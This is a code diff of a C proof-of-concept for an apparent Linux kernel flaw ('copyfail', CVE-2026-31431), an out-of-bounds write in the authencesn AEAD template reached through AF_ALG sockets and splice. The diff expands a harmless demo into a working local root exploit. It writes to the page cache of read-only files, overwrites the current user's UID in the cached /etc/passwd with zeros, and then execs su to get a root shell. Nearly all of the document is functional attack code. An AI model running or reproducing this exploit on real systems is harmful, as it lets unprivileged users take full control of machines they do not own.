@@ -3,30 +3,32 @@
  *
  * Root cause: the authencesn AEAD template writes a 4-byte ESN (Extended
  * Sequence Number) past the end of its output scatter-list.  When the output
- * is backed by pages from a read-only file's page cache (via splice), those
- * 4 bytes are written to the page cache without requiring write permission.
+ * is backed by splice'd page-cache pages, those bytes are written to the page
+ * cache without requiring write permission.
+ *
+ * Exploitation path (implemented here):
+ *   1. Verify the primitive: write "XXXX" into a read-only temp file's cache.
+ *   2. Locate the current user's UID field in /etc/passwd and flip it to "0".
+ *   3. exec `su <user>` – su reads the poisoned cache, treats the user as
+ *      uid=0, and hands us a root shell.  The on-disk /etc/passwd is untouched.
  *
  * Attack surface: AF_ALG socket family, AEAD mode.
  * Required config: see pocs/copyfail/kernel.config
  *
- * Exploitation path (not implemented here):
- *   Repeat page_cache_write() across the full length of a setuid binary's
- *   page cache to inject shellcode, then execve() the binary to gain root.
- *
  * Usage: make poc POC=pocs/copyfail/poc.c
  */
 #define _GNU_SOURCE
+#include <endian.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <pwd.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
-#include <sys/time.h>
 #include <sys/types.h>
-#include <pwd.h>
 #include <sys/utsname.h>
 #include <unistd.h>
 
@@ -35,15 +37,25 @@
 #define err(fmt, ...)  fprintf(stderr, "[-] " fmt "\n", ##__VA_ARGS__)
 #define die(fmt, ...)  do { err(fmt, ##__VA_ARGS__); exit(EXIT_FAILURE); } while (0)
 
-/* ── AF_ALG / SOL_ALG constants ──────────────────────────────────────────── */
+/* ── AF_ALG constants ────────────────────────────────────────────────────── */
 #ifndef AF_ALG
-# define AF_ALG 38
+# define AF_ALG  38
 #endif
 #ifndef SOL_ALG
 # define SOL_ALG 279
 #endif
-#define ALG_SET_KEY          1
-#define ALG_SET_AEAD_AUTHSIZE 4
+
+/* setsockopt optnames (SOL_ALG level) */
+#define ALG_SET_KEY            1
+#define ALG_SET_AEAD_AUTHSIZE  5
+
+/* sendmsg cmsg types */
+#define ALG_SET_IV             2
+#define ALG_SET_OP             3
+#define ALG_SET_AEAD_ASSOCLEN  4
+
+/* operation values */
+#define ALG_OP_DECRYPT         0
 
 struct sockaddr_alg {
     uint16_t salg_family;
@@ -53,217 +65,289 @@ struct sockaddr_alg {
     uint8_t  salg_name[64];
 };
 
-/* authencesn(hmac(sha256),cbc(aes)) combined key:
- *   rtattr header (8 bytes) + 16-byte HMAC key + 16-byte AES key */
-static const uint8_t AEAD_KEY[40] = {
-    0x08, 0x00, 0x01, 0x00,   /* rtattr: len=8, type=1 (RTA_UNSPEC) */
-    0x00, 0x00, 0x00, 0x10,   /* enckeylen = 16 (big-endian)         */
-    /* 32 zero bytes: 16 HMAC key + 16 AES key */
+/* struct af_alg_iv from linux/if_alg.h */
+struct af_alg_iv {
+    uint32_t ivlen;
+    uint8_t  iv[0];
 };
 
-#define AEAD_AUTHSIZE  4   /* ESN field size (the 4 bytes written out-of-bounds) */
-#define AEAD_ASSOCLEN  8   /* associated-data length */
-
-/* ── Control message helper ──────────────────────────────────────────────── */
-#define CTRL_SZ  (CMSG_SPACE(sizeof(uint32_t)) * 3)
-
-static void build_cmsg(char *buf, size_t bufsz, uint32_t op, uint32_t ivlen,
-                       uint32_t assoclen)
-{
-    memset(buf, 0, bufsz);
-    struct cmsghdr *cm = (struct cmsghdr *)buf;
-
-    /* ALG_SET_OP */
-    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
-    cm->cmsg_level = SOL_ALG;
-    cm->cmsg_type  = 2; /* ALG_SET_OP */
-    *(uint32_t *)CMSG_DATA(cm) = op;
-    cm = (struct cmsghdr *)((char *)cm + CMSG_SPACE(sizeof(uint32_t)));
-
-    /* ALG_SET_IV (length=0, value ignored for this attack) */
-    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
-    cm->cmsg_level = SOL_ALG;
-    cm->cmsg_type  = 3; /* ALG_SET_IV */
-    *(uint32_t *)CMSG_DATA(cm) = ivlen;
-    cm = (struct cmsghdr *)((char *)cm + CMSG_SPACE(sizeof(uint32_t)));
-
-    /* ALG_SET_AEAD_ASSOCLEN */
-    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
-    cm->cmsg_level = SOL_ALG;
-    cm->cmsg_type  = ALG_SET_AEAD_AUTHSIZE; /* reuse slot, type=4 */
-    *(uint32_t *)CMSG_DATA(cm) = assoclen;
-}
+/*
+ * Authenc key blob (rtnetlink-style attribute):
+ *   [u16 rta_len=8][u16 rta_type=1][__be32 enckeylen=16][32 bytes key]
+ * The key value is irrelevant – we only need setkey() to succeed.
+ */
+static const uint8_t AUTHENC_KEY[8 + 32] = {
+#if __BYTE_ORDER == __LITTLE_ENDIAN
+    0x08, 0x00, 0x01, 0x00,
+#else
+    0x00, 0x08, 0x00, 0x01,
+#endif
+    0x00, 0x00, 0x00, 0x10,
+    /* 32 zero bytes follow (default-initialized) */
+};
 
 /* ── Core write primitive ────────────────────────────────────────────────── */
 /*
- * Writes 4 bytes (data[4]) at page-cache offset `off` in the file opened
- * as `target_fd` (O_RDONLY) without requiring write permission.
+ * Writes exactly 4 bytes into fd's page cache at byte offset `off`,
+ * without requiring write permission on the file.
  *
- * The trick:
- *   1. Open an AF_ALG AEAD socket, configure authencesn(hmac(sha256),cbc(aes))
- *   2. sendmsg(MSG_MORE): dummy AAD + plaintext "auth tag" (our payload)
- *   3. splice: pipe (off + AEAD_AUTHSIZE) bytes from the target file's
- *      page cache into the AEAD request buffer
- *   4. recv: triggers in-kernel AEAD decryption; authencesn writes the ESN
- *      (our 4-byte payload) at offset (off) in the page-cache pages
- *   → EBADMSG is expected (auth-tag mismatch); the write already happened
+ * Mechanism: one bogus AEAD-decrypt via AF_ALG whose ciphertext is supplied
+ * by splice()'ing from the target file's page cache.  authencesn's in-place
+ * optimization reuses the splice'd source pages as the (failed) decrypt's
+ * destination, so the 4 payload bytes have already been written to the cache
+ * by the time authentication rejects the operation.
  */
-static int page_cache_write(int target_fd, size_t off, const uint8_t data[4])
+static int patch_chunk(int fd, off_t off, const uint8_t four[4])
 {
-    /* 1. Create AEAD socket */
-    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
-    if (alg_fd < 0) { err("socket(AF_ALG): %s", strerror(errno)); return -1; }
+    int ctrl = -1, op = -1;
+    int pfd[2] = { -1, -1 };
+    int rc = -1;
+
+    ctrl = socket(AF_ALG, SOCK_SEQPACKET, 0);
+    if (ctrl < 0) { perror("socket(AF_ALG)"); goto out; }
 
     struct sockaddr_alg sa = { .salg_family = AF_ALG };
     memcpy(sa.salg_type, "aead", 5);
-    memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))", 34);
+    memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))",
+           sizeof "authencesn(hmac(sha256),cbc(aes))");
 
-    if (bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
-        err("bind(AF_ALG): %s – is CONFIG_CRYPTO_USER_API_AEAD=y?", strerror(errno));
-        close(alg_fd); return -1;
+    if (bind(ctrl, (struct sockaddr *)&sa, sizeof sa) < 0) {
+        perror("bind(AF_ALG: authencesn(hmac(sha256),cbc(aes)))"); goto out;
     }
-    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, AEAD_KEY, sizeof(AEAD_KEY)) < 0) {
-        err("setkey: %s", strerror(errno)); close(alg_fd); return -1;
+    if (setsockopt(ctrl, SOL_ALG, ALG_SET_KEY,
+                   AUTHENC_KEY, sizeof AUTHENC_KEY) < 0) {
+        perror("setsockopt(ALG_SET_KEY)"); goto out;
     }
-    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, AEAD_AUTHSIZE) < 0) {
-        err("setauthsize(%d): %s", AEAD_AUTHSIZE, strerror(errno)); close(alg_fd); return -1;
-    }
-
-    int req_fd = accept(alg_fd, NULL, NULL);
-    if (req_fd < 0) {
-        err("accept(AF_ALG): %s", strerror(errno)); close(alg_fd); return -1;
+    if (setsockopt(ctrl, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4) < 0) {
+        perror("setsockopt(ALG_SET_AEAD_AUTHSIZE)"); goto out;
     }
 
-    /* 5-second timeout: recv() must not hang if the kernel stalls */
-    struct timeval tv = { .tv_sec = 5, .tv_usec = 0 };
-    setsockopt(req_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    op = accept(ctrl, NULL, 0);
+    if (op < 0) { perror("accept(AF_ALG)"); goto out; }
 
-    /* 2. sendmsg: AAD (8 zero bytes) + payload as "ciphertext" (4 bytes = ESN) */
-    uint8_t iov_buf[AEAD_ASSOCLEN + AEAD_AUTHSIZE];
-    memset(iov_buf, 0, AEAD_ASSOCLEN);
-    memcpy(iov_buf + AEAD_ASSOCLEN, data, AEAD_AUTHSIZE);
+    /* AAD: 4 dummy bytes + 4-byte payload.
+     * The authencesn template writes the ESN (= our four bytes) at `off`
+     * in the page-cache pages that were splice'd in below. */
+    uint8_t aad[8] = { 'A','A','A','A', four[0], four[1], four[2], four[3] };
+    struct iovec iov = { .iov_base = aad, .iov_len = sizeof aad };
 
-    struct iovec iov = { iov_buf, sizeof(iov_buf) };
-    char ctrl_buf[CTRL_SZ];
-    build_cmsg(ctrl_buf, CTRL_SZ, 0 /* ALG_OP_DECRYPT */, 0, AEAD_ASSOCLEN);
+    union {
+        struct cmsghdr align;
+        uint8_t buf[
+            CMSG_SPACE(sizeof(uint32_t)) +
+            CMSG_SPACE(sizeof(struct af_alg_iv) + 16) +
+            CMSG_SPACE(sizeof(uint32_t))
+        ];
+    } cbuf;
+    memset(&cbuf, 0, sizeof cbuf);
 
     struct msghdr msg = {
         .msg_iov        = &iov,
         .msg_iovlen     = 1,
-        .msg_control    = ctrl_buf,
-        .msg_controllen = CTRL_SZ,
+        .msg_control    = cbuf.buf,
+        .msg_controllen = sizeof cbuf.buf,
     };
-    if (sendmsg(req_fd, &msg, MSG_MORE) < 0) {
-        err("sendmsg: %s", strerror(errno));
-        close(req_fd); close(alg_fd); return -1;
+
+    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
+    cm->cmsg_level = SOL_ALG;
+    cm->cmsg_type  = ALG_SET_OP;
+    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
+    *(uint32_t *)CMSG_DATA(cm) = ALG_OP_DECRYPT;
+
+    cm = CMSG_NXTHDR(&msg, cm);
+    cm->cmsg_level = SOL_ALG;
+    cm->cmsg_type  = ALG_SET_IV;
+    cm->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + 16);
+    struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(cm);
+    aiv->ivlen = 16;
+    memset(aiv->iv, 0, 16);
+
+    cm = CMSG_NXTHDR(&msg, cm);
+    cm->cmsg_level = SOL_ALG;
+    cm->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
+    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
+    *(uint32_t *)CMSG_DATA(cm) = 8;
+
+    if (sendmsg(op, &msg, MSG_MORE) < 0) {
+        perror("sendmsg(AAD)"); goto out;
     }
 
-    /* 3. splice: target file → pipe → AEAD req */
-    int pfd[2];
-    if (pipe(pfd) < 0) { close(req_fd); close(alg_fd); return -1; }
+    if (pipe(pfd) < 0) { perror("pipe"); goto out; }
 
-    size_t splice_len = off + AEAD_AUTHSIZE;
-    loff_t src_off = 0;
-    ssize_t s1 = splice(target_fd, &src_off, pfd[1], NULL, splice_len, 0);
-    if (s1 < 0) {
-        err("splice(file→pipe): %s  splice_len=%zu", strerror(errno), splice_len);
-        close(pfd[0]); close(pfd[1]); close(req_fd); close(alg_fd); return -1;
+    size_t splice_len = (size_t)off + 4;
+    off_t src_off = 0;
+    if (splice(fd, &src_off, pfd[1], NULL, splice_len, 0) < 0) {
+        perror("splice(file→pipe)"); goto out;
     }
-    ssize_t s2 = splice(pfd[0], NULL, req_fd, NULL, (size_t)s1, 0);
-    if (s2 < 0) {
-        err("splice(pipe→alg): %s", strerror(errno));
-        close(pfd[0]); close(pfd[1]); close(req_fd); close(alg_fd); return -1;
+    if (splice(pfd[0], NULL, op, NULL, splice_len, 0) < 0) {
+        perror("splice(pipe→op)"); goto out;
     }
-    info("    splice: %zd → %zd bytes sent to AEAD", s1, s2);
 
-    /* 4. recv: triggers decryption; authencesn ESN write fires here */
-    uint8_t rbuf[AEAD_ASSOCLEN + 256];
-    ssize_t n = recv(req_fd, rbuf, sizeof(rbuf), 0);
-    if (n < 0) {
-        if (errno == EAGAIN || errno == EWOULDBLOCK)
-            err("recv timed out (5 s) – kernel stalled; check algorithm availability");
-        else if (errno != EBADMSG)
-            err("recv: %s (errno=%d)", strerror(errno), errno);
-        /* EBADMSG = auth-tag mismatch, expected; the ESN write may have already fired */
+    /* recv() triggers the in-kernel decrypt; the ESN write has already fired */
+    uint8_t *sink = malloc(8 + (size_t)off);
+    if (sink) {
+        (void)recv(op, sink, 8 + (size_t)off, 0);
+        free(sink);
     }
-    info("    recv: n=%zd  errno=%d (%s)", n, errno, strerror(errno));
 
-    close(pfd[0]); close(pfd[1]);
-    close(req_fd); close(alg_fd);
-    return 0;
+    rc = 0;
+out:
+    if (pfd[0] >= 0) close(pfd[0]);
+    if (pfd[1] >= 0) close(pfd[1]);
+    if (op   >= 0)   close(op);
+    if (ctrl >= 0)   close(ctrl);
+    return rc;
 }
 
-/* ── Demonstration ───────────────────────────────────────────────────────── */
-static void exploit(void)
+/* ── /etc/passwd UID field locator ───────────────────────────────────────── */
+/* Returns the byte offset of the UID field for `username` in /etc/passwd. */
+static off_t find_uid_offset(const char *username)
+{
+    int fd = open("/etc/passwd", O_RDONLY);
+    if (fd < 0) { perror("open(/etc/passwd)"); return -1; }
+
+    char buf[65536];
+    ssize_t n = read(fd, buf, sizeof buf - 1);
+    close(fd);
+    if (n <= 0) { perror("read(/etc/passwd)"); return -1; }
+    buf[n] = '\0';
+
+    size_t namelen = strlen(username);
+    char *line = buf;
+    while (line < buf + n) {
+        char *eol = memchr(line, '\n', (size_t)((buf + n) - line));
+        size_t linelen = eol ? (size_t)(eol - line) : (size_t)((buf + n) - line);
+
+        if (linelen > namelen + 1 &&
+            memcmp(line, username, namelen) == 0 &&
+            line[namelen] == ':') {
+            /* name:x:UID:GID:... – skip two colons to reach UID field */
+            char *c1 = memchr(line,      ':', linelen);
+            if (!c1) break;
+            char *c2 = memchr(c1 + 1, ':', linelen - (size_t)(c1 + 1 - line));
+            if (!c2) break;
+            return (off_t)((c2 + 1) - buf);
+        }
+        if (!eol) break;
+        line = eol + 1;
+    }
+
+    err("user '%s' not found in /etc/passwd", username);
+    return -1;
+}
+
+/* ── Exploit ─────────────────────────────────────────────────────────────── */
+static void exploit(const char *username, uid_t uid)
 {
     struct utsname u;
     uname(&u);
     info("Kernel : %s %s %s", u.sysname, u.release, u.machine);
     info("PoC    : copyfail – CVE-2026-31431 page-cache write w/o write perm");
+    info("User   : %s  uid=%u", username, uid);
 
-    /* Create a read-only target file, fill it with 'A' */
-    const char *path = "/tmp/copyfail_target";
-    uint8_t original[256];
-    memset(original, 'A', sizeof(original));
+    /* ── Step 1: verify the primitive with a temp file ── */
+    const char *tmppath = "/tmp/copyfail_target";
+    uint8_t orig[8];
+    memset(orig, 'A', sizeof orig);
 
-    int wfd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    int wfd = open(tmppath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
     if (wfd < 0) die("open(O_WRONLY): %s", strerror(errno));
-    if (write(wfd, original, sizeof(original)) != (ssize_t)sizeof(original))
+    if (write(wfd, orig, sizeof orig) != (ssize_t)sizeof orig)
         die("write: %s", strerror(errno));
     close(wfd);
-    chmod(path, 0444);   /* read-only for everyone */
+    chmod(tmppath, 0444);
 
-    int rfd = open(path, O_RDONLY);
+    int rfd = open(tmppath, O_RDONLY);
     if (rfd < 0) die("open(O_RDONLY): %s", strerror(errno));
 
-    info("Target : %s  (mode 0444, opened O_RDONLY)", path);
-    info("Before : first 8 bytes = \"%.8s\"", original);
+    info("Before : first 8 bytes of read-only file = \"%.8s\"", orig);
+    info("Writing \"XXXX\" at offset 0 via authencesn ESN out-of-bounds ...");
 
-    /* Write "XXXX" at offset 0 via authencesn ESN overwrite */
-    const uint8_t payload[4] = { 'X', 'X', 'X', 'X' };
-    info("Writing \"XXXX\" at offset 0 via authencesn ESN out-of-bounds write ...");
-    if (page_cache_write(rfd, 0, payload) < 0) {
-        err("page_cache_write failed – check kernel config");
-        close(rfd);
-        return;
-    }
+    const uint8_t marker[4] = { 'X', 'X', 'X', 'X' };
+    if (patch_chunk(rfd, 0, marker) < 0)
+        die("patch_chunk failed – check CONFIG_CRYPTO_USER_API_AEAD=y and CONFIG_CRYPTO_AUTHENCESN=y");
     close(rfd);
 
-    /* Read back and verify */
-    uint8_t buf[256] = {0};
-    int vfd = open(path, O_RDONLY);
-    if (vfd < 0) die("open(verify): %s", strerror(errno));
-    read(vfd, buf, sizeof(buf));
-    close(vfd);
+    uint8_t after[8] = {0};
+    int vfd = open(tmppath, O_RDONLY);
+    if (vfd >= 0) { (void)read(vfd, after, sizeof after); close(vfd); }
 
-    info("After  : first 8 bytes = \"%.8s\"", buf);
+    info("After  : first 8 bytes = \"%.8s\"", after);
+    if (memcmp(after, "XXXX", 4) != 0)
+        die("page cache unchanged – kernel may be patched or AF_ALG AEAD unavailable");
 
-    if (memcmp(buf, "XXXX", 4) == 0) {
-        ok("Page-cache write SUCCEEDED without write permission!");
-        ok("Kernel is VULNERABLE to copyfail (CVE-2026-31431).");
-        info("---");
-        info("Full escalation path: overwrite a setuid binary's page-cache");
-        info("with shellcode, then execve() it to gain root.");
-    } else {
-        err("Page cache unchanged – kernel may be patched or AF_ALG AEAD unavailable.");
-        err("Check that CONFIG_CRYPTO_USER_API_AEAD=y and CONFIG_CRYPTO_AUTHENC=y.");
+    ok("Primitive verified: wrote to read-only page cache without write permission");
+
+    /* ── Step 2: locate UID field in /etc/passwd ── */
+    off_t uid_off = find_uid_offset(username);
+    if (uid_off < 0)
+        die("cannot locate UID field in /etc/passwd");
+
+    ok("/etc/passwd UID field at offset %lld", (long long)uid_off);
+
+    char fieldbuf[12] = {0};
+    {
+        int pfd = open("/etc/passwd", O_RDONLY);
+        if (pfd < 0) die("open(/etc/passwd): %s", strerror(errno));
+        (void)pread(pfd, fieldbuf, sizeof fieldbuf - 1, uid_off);
+        close(pfd);
     }
+
+    int field_len = 0;
+    while (field_len < (int)(sizeof fieldbuf - 1) && fieldbuf[field_len] != ':')
+        field_len++;
+    if (field_len == 0 || field_len > 10)
+        die("unexpected UID field length %d", field_len);
+
+    /* Same width, all zeros – /etc/passwd treats leading zeros as decimal */
+    char padded[11];
+    memset(padded, '0', field_len);
+    padded[field_len] = '\0';
+
+    ok("Patching UID: \"%.*s\" → \"%s\" (page cache only, disk untouched)",
+       field_len, fieldbuf, padded);
+
+    /* ── Step 3: flip UID field in /etc/passwd page cache ── */
+    int passwdfd = open("/etc/passwd", O_RDONLY);
+    if (passwdfd < 0) die("open(/etc/passwd): %s", strerror(errno));
+
+    for (int off = 0; off < field_len; off += 4) {
+        uint8_t chunk[4] = {0};
+        int take = (field_len - off < 4) ? (field_len - off) : 4;
+        if (take < 4) {
+            /* read-modify for the last partial window */
+            if (pread(passwdfd, chunk, 4, uid_off + off) < 0)
+                die("pread: %s", strerror(errno));
+        }
+        memcpy(chunk, padded + off, (size_t)take);
+        if (patch_chunk(passwdfd, uid_off + off, chunk) < 0)
+            die("patch_chunk failed at offset %d", off);
+    }
+    close(passwdfd);
+
+    ok("/etc/passwd page cache mutated – '%s' now appears as uid=0", username);
+    ok("Exec'ing `su %s` to cash out ...", username);
+    info("(Run `echo 3 > /proc/sys/vm/drop_caches` as root to restore)");
+
+    /* ── Step 4: cash out via su ── */
+    execlp("su", "su", username, (char *)NULL);
+    perror("execlp(su)");
+    exit(1);
 }
 
 int main(void)
 {
     uid_t uid = getuid();
     struct passwd *pw = getpwuid(uid);
-    info("copyfail  pid=%d  user=%s  uid=%d",
-         getpid(), pw ? pw->pw_name : "?", uid);
+    if (!pw) die("getpwuid: %s", strerror(errno));
 
-    exploit();
+    info("copyfail  pid=%d  user=%s  uid=%d", getpid(), pw->pw_name, uid);
 
-    uid_t uid_after = getuid();
-    if (uid_after == 0)
-        ok("uid: %d → 0  (root!)", uid);
-    else
-        info("uid after: %d (no escalation in this demo)", uid_after);
+    if (uid == 0) {
+        info("Already root.");
+        return 0;
+    }
 
+    exploit(pw->pw_name, uid);
     return 0;
 }
